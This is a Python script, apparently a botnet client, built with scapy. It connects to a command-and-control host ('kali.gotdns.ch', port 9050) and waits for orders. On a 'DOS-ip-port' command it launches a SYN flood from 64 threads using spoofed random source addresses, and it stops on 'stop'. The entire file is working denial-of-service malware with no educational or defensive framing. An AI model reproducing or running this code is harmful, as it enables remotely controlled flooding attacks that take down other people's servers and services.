#!/usr/bin/python3

from scapy.layers.inet import IP, TCP
from scapy.all import *
import socket
import random
import threading

ip = 'kali.gotdns.ch'
port = 9050 # Define the port on which you want to connect

attack = False
target_ip = ""
target_port = 0

#Generate Random IP
def randomIP():
    randomip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    return randomip

#Generate Random Port number
def randInt():
    x = random.randint(1000, 9000)
    return x

def SYN_Flood():
    while True:
        if attack:
            s_port = randInt() #source port number
            s_eq = randInt() #sequence
            w_indow = randInt() #get random size

            IP_Packet = IP()
            IP_Packet.src = randomIP() #get random IP
            IP_Packet.dst = target_ip#target IP address

            TCP_Packet = TCP()
            TCP_Packet.sport =s_port #source port number
            TCP_Packet.dport = target_port #target port number
            TCP_Packet.flags = "S" #type of the flag
            TCP_Packet.seq = s_eq
            TCP_Packet.window = w_indow

            send(IP_Packet / TCP_Packet, verbose=0)

        else:
            time.sleep(2)


def choice(data):
    global target_ip, target_port, attack
    if b'DOS' in data:
        target_ip = data.split(b'-')[1].decode('utf-8')
        target_port = int(data.split(b'-')[-1].decode('utf-8'))
        attack = True

    elif data == b'stop':
        attack = False

for _ in range(64):
    p1 = threading.Thread(target=SYN_Flood)
    p1.start()

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip,port))

        data = b''
        while data != b'Exit':
            data = s.recv(1024)
            choice(data)
    except:
        time.sleep(2)
